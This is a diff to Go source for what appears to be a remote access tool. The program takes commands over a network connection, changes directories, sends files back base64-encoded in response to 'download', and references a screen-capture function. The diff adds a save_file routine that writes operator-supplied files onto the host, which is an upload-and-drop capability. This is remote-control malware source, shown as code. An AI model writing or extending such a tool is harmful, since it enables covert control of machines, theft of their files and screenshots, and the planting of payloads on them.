@@ -48,7 +48,7 @@ func main() {
 					send_msg(conn, fmt.Sprintf("Dir changed successfully to %s", cur_wd))
 				}
 			}
-		} else if strings.Split(cmd, " ")[0] == "download" { 
+		} else if strings.Split(cmd, " ")[0] == "download" {
 			if cmd == "download" {
 				send_msg(conn, "Supply a file to download :|")
 			} else {
@@ -102,6 +102,15 @@ func read_file(file string) string {
 		return "file:" + file_b64(file)
 	}
 	return "An error occurred"
+}
+
+func save_file(file string, b64_content string) string {
+	content, err := b64.StdEncoding.DecodeString(b64_content)
+	if err != nil {
+		return err.Error()
+	}
+	os.WriteFile(file, content, 0766)
+	return fmt.Sprintf("%s saved successfully", file)
 }
 
 func capture_scr() string {
